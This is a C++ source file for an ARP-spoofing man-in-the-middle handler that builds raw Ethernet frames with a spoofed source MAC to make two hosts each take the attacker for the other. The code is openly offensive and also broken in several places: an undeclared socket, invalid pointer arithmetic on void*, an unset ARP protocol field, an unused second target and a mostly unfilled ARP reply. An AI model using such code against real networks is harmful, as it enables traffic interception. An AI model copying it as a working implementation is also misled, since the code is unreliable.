#include "../include/mitmhandler.h"

/*
 *	Makes target1 think client is target2, and makes target2 think client is target1
 */
MitmHandler::MitmHandler(std::string const& target1, std::string const& target2) {
	this->send(target1);
}

MitmHandler::~MitmHandler() {

}

void MitmHandler::send(std::string const& sIpAddrStr) {
	// Init ethernet destination address struct 
	struct sockaddr_ll socket_address;

	// Init the full buffer of the ethernet frame 
	void* buffer = (void*)malloc(ETH_FRAME_LEN);
	 
	// Define pointer to ethernet header data as part of the buffer 
	unsigned char* etherhead = buffer;
		
	// ARP data pointer that takes up ETH_FRAME_LEN - 14 bytes (ARP in this case) 
	unsigned char* data = buffer + 14;
		
	// Defined the 14 byte etherhead as type ethhdr struct 
	struct ethhdr *eh = (struct ethhdr *)etherhead;
	 
	int send_result = 0;

	// Our MAC address, should be spoofed to correspond to the non destination target's MAC 
	unsigned char src_mac[6] = {0x00, 0x01, 0x02, 0xFA, 0x70, 0xAA};

	// Ethernet destination MAC 
	unsigned char dest_mac[6] = {0x00, 0x04, 0x75, 0xC8, 0x28, 0xE5};

	// RAW communication
	socket_address.sll_family   = PF_PACKET;	
	// Random protocol as we never move past layer 2
	socket_address.sll_protocol = htons(ETH_P_IP);	

	// Set index of network interface to use
	socket_address.sll_ifindex  = 2;

	// Set frame type to ARP 
	socket_address.sll_hatype = ARPHRD_ETHER;
		
	// Target is other host 
	socket_address.sll_pkttype = PACKET_OTHERHOST;

	// Set length of ethernet target address
	socket_address.sll_halen = ETH_ALEN;		
	// Set frame target MAC
	socket_address.sll_addr[0] = 0x00;		
	socket_address.sll_addr[1] = 0x04;		
	socket_address.sll_addr[2] = 0x75;
	socket_address.sll_addr[3] = 0xC8;
	socket_address.sll_addr[4] = 0x28;
	socket_address.sll_addr[5] = 0xE5;
	// Padding 
	socket_address.sll_addr[6] = 0x00;
	socket_address.sll_addr[7] = 0x00;


	// Set ethernet frame header 
	memcpy((void*)buffer, (void*)dest_mac, ETH_ALEN);
	memcpy((void*)(buffer + ETH_ALEN), (void*)src_mac, ETH_ALEN);
	eh->h_proto = 0x00;

	// Build the arpreply data struct 
	arpreply ap;

	// Convert target1 IP address string to byte array
	byte* sPAddr = ArpGyp::stringToIp(sIpAddrStr);

	// Set sender IP to target 
	// memcpy(&ap.srcPAddr, &tempSHwAddr, 6);
	// Set sender MAC to local machines mac
	memcpy(&ap.srcPAddr, &sPAddr, 4);

	// Copy the ARP data into the frame data. ARP reply data always takes 28 bytes
	memcpy(data, &ap, 28);

	// Send the packet
	send_result = sendto(s, buffer, ETH_FRAME_LEN, 0, 
		      (struct sockaddr*)&socket_address, sizeof(socket_address));
	if (send_result == -1) {  }
}